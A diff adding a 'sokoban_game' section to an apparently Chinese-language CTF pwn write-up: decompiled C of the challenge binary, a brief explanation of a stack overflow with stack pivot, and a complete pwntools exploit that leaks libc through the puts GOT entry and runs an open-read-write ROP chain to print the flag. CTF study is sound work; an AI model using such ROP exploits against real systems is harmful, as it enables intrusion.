@@ -3291,6 +3291,296 @@ p.interactive()
 
 总结：这个手法主要是使用的故意修改cnanary，并且修改jnz为jl来修改一个跳转的结果，是的我们写一个ret
 
+## sokoban_game
+
+```c
+__int64 __fastcall main(int a1, char **a2, char **a3)
+{
+  FILE *v3; // rdi
+  int v5; // eax
+  _BYTE buf[16]; // [rsp+10h] [rbp-130h] BYREF
+  _DWORD v7[64]; // [rsp+20h] [rbp-120h] BYREF
+  int v8; // [rsp+120h] [rbp-20h]
+  int v9; // [rsp+124h] [rbp-1Ch]
+  int v10; // [rsp+128h] [rbp-18h]
+  int v11; // [rsp+12Ch] [rbp-14h]
+  int j; // [rsp+130h] [rbp-10h]
+  int i; // [rsp+134h] [rbp-Ch]
+  int v14; // [rsp+138h] [rbp-8h]
+  int v15; // [rsp+13Ch] [rbp-4h]
+
+  setbuf(stdout, 0);
+  v3 = stderr;
+  setbuf(stderr, 0);
+  sub_4007A7(v3);
+  v7[0] = 0;
+  v7[1] = 0;
+  v7[2] = 0;
+  v7[3] = 1;
+  v7[4] = 1;
+  v7[5] = 1;
+  v7[6] = 0;
+  v7[7] = 0;
+  v7[8] = 0;
+  v7[9] = 0;
+  v7[10] = 1;
+  v7[11] = 4;
+  v7[12] = 4;
+  v7[13] = 1;
+  v7[14] = 0;
+  v7[15] = 0;
+  v7[16] = 0;
+  v7[17] = 0;
+  v7[18] = 1;
+  v7[19] = 0;
+  v7[20] = 4;
+  v7[21] = 1;
+  v7[22] = 1;
+  v7[23] = 0;
+  v7[24] = 1;
+  v7[25] = 1;
+  v7[26] = 0;
+  v7[27] = 0;
+  v7[28] = 3;
+  v7[29] = 4;
+  v7[30] = 1;
+  v7[31] = 0;
+  v7[32] = 1;
+  v7[33] = 1;
+  v7[34] = 0;
+  v7[35] = 3;
+  v7[36] = 0;
+  v7[37] = 0;
+  v7[38] = 1;
+  v7[39] = 1;
+  v7[40] = 1;
+  v7[41] = 0;
+  v7[42] = 0;
+  v7[43] = 0;
+  v7[44] = 3;
+  v7[45] = 3;
+  v7[46] = 0;
+  v7[47] = 1;
+  v7[48] = 1;
+  v7[49] = 2;
+  memset(&v7[50], 0, 20);
+  v7[55] = 1;
+  v7[56] = 1;
+  v7[57] = 1;
+  v7[58] = 1;
+  v7[59] = 1;
+  v7[60] = 1;
+  v7[61] = 1;
+  v7[62] = 1;
+  v7[63] = 1;
+  v11 = 0;
+  v10 = 0;
+  v9 = 6;
+  v8 = 1;
+  puts("Welcome to sokoban game!");
+  while ( 1 )
+  {
+    printf("\x1Bc");
+    v11 = 0;
+    v15 = 0;
+    v14 = 0;
+    for ( i = 0; i <= 7; ++i )
+    {
+      for ( j = 0; j <= 7; ++j )
+      {
+        switch ( v7[8 * i + j] )
+        {
+          case 0:
+            putchar(' ');
+            break;
+          case 1:
+            putchar('*');
+            break;
+          case 2:
+          case 6:
+            putchar('@');
+            break;
+          case 3:
+            putchar('#');
+            break;
+          case 4:
+            putchar('o');
+            break;
+          case 7:
+            ++v11;
+            putchar('#');
+            break;
+          default:
+            continue;
+        }
+      }
+      putchar(10);
+    }
+    if ( v11 == 4 )
+      break;
+    v11 = 0;
+    v15 = 0;
+    v14 = 0;
+    v5 = getchar();
+    if ( v5 == 'd' )
+    {
+      ++v14;
+    }
+    else if ( v5 > 'd' )
+    {
+      if ( v5 == 's' )
+      {
+        ++v15;
+      }
+      else if ( v5 == 'w' )
+      {
+        --v15;
+      }
+    }
+    else if ( v5 == 'a' )
+    {
+      --v14;
+    }
+    if ( v7[8 * v9 + 8 * v15 + v8 + v14] && v7[8 * v9 + 8 * v15 + v8 + v14] != 4 )
+    {
+      if ( (v7[8 * v9 + 8 * v15 + v8 + v14] == 3 || v7[8 * v9 + 8 * v15 + v8 + v14] == 7)
+        && (!v7[16 * v15 + 8 * v9 + 2 * v14 + v8] || v7[16 * v15 + 8 * v9 + 2 * v14 + v8] == 4) )
+      {
+        v7[16 * v15 + 8 * v9 + 2 * v14 + v8] += 3;
+        v7[8 * v9 + 8 * v15 + v14 + v8] = v7[8 * v9 + 8 * v15 + v8 + v14] - 1;
+        v7[8 * v9 + v8] -= 2;
+        v9 += v15;
+        v8 += v14;
+        ++v10;
+      }
+    }
+    else
+    {
+      v7[8 * v9 + 8 * v15 + v14 + v8] = v7[8 * v9 + 8 * v15 + v8 + v14] + 2;
+      v7[8 * v9 + v8] -= 2;
+      v9 += v15;
+      v8 += v14;
+      ++v10;
+    }
+  }
+  printf("Hero,Please leave your name:");
+  read(0, buf, v10);
+  return 0;
+}
+```
+
+这个题目这个题目是一个栈溢出+一个栈迁移的题目，这个迁移的原因应该是我们需要搞一个orw的代码并且进行一个运行这里我们直接进行要给写入，这里还有一个原因就是他只能使用一个输入点，因此这里我们直接写一个到要给bss，还有一个原因就是他的地址不是随机变的，直接直接使用这个地址进行要给flag_addr
+
+```py
+from pwn import *
+context(arch='amd64', os='linux', log_level='debug')
+#p = remote('61.147.171.35',62070)  
+p = process('./sokoban_patched')
+elf = ELF('./sokoban')
+libc = ELF('libc.so.6')
+puts_plt = elf.plt['puts']
+puts_got = elf.got['puts']
+rdi = 0x400f63
+ret = 0x40061e
+csu_1 = 0x400f5a
+csu_2 = 0x400f40
+read_got = elf.got['read']
+bss_addr = 0x602500
+rbp = 0x400728
+leave = 0x400834
+prsi = 0x400f61
+p.sendline(b'd')
+p.sendline(b'd')
+p.sendline(b'w')
+p.sendline(b'w')
+p.sendline(b'w')
+p.sendline(b'w')
+p.sendline(b's')
+p.sendline(b's')
+p.sendline(b'd')
+p.sendline(b'w')
+p.sendline(b'w')
+p.sendline(b's')
+p.sendline(b's')
+p.sendline(b'a')
+p.sendline(b's')
+p.sendline(b's')
+p.sendline(b'd')
+p.sendline(b'w')
+p.sendline(b'w')
+p.sendline(b'w')
+p.sendline(b's')
+p.sendline(b's')
+p.sendline(b's')
+p.sendline(b'd')
+p.sendline(b'w')
+count = 25
+for i in range(500):
+    p.sendline(b'a')
+    p.sendline(b'd')
+p.sendline(b'w')
+
+payload1 = flat([
+    b'A' * 312,
+    ret,
+    rdi,
+    puts_got,
+    puts_plt,
+    csu_1,
+    0,
+    1,
+    read_got,
+    0,
+    bss_addr,
+    0x200,
+    csu_2,
+    p64(0),
+    p64(0),
+    p64(0),
+    p64(0),
+    p64(0),
+    p64(0),
+    p64(0),
+    rbp,
+    bss_addr,
+    leave
+    ])
+p.sendafter(b'Hero,Please leave your name:',payload1)
+leak_data = p.recv(6)  
+leak_puts = u64(leak_data.ljust(8, b'\x00'))
+log.success(f"泄露的puts地址: {hex(leak_puts)}")
+libc_base = leak_puts - libc.symbols['puts']
+log.success(f"泄露的libc地址: {hex(libc_base)}")
+libc.address = libc_base
+prdx = libc_base + 0x1b96
+syscall = libc_base + 0xd2625
+prax = libc_base + 0x1b500
+log.success(f"泄露的syscall地址: {hex(syscall)}")
+payload2 = flat([
+    b'deadbeef',
+    prax, 2,
+    rdi, bss_addr + 0x100,
+    prsi, 0, 0,
+    prdx, 0,
+    syscall,
+
+    rdi, 3,
+    prsi, bss_addr + 0x200, 0,
+    prdx, 0x50,
+    libc.sym['read'],
+
+    rdi, 1,
+    prsi, bss_addr + 0x200, 0,
+    prdx, 0x50,
+    libc.sym['write'],
+])
+payload2 = payload2.ljust(0x100, b'\x00') + b'flag\x00'
+p.send(payload2)
+p.interactive()
+```
+
+
+
 ## 浙江省赛初赛
 
 ### pwn1
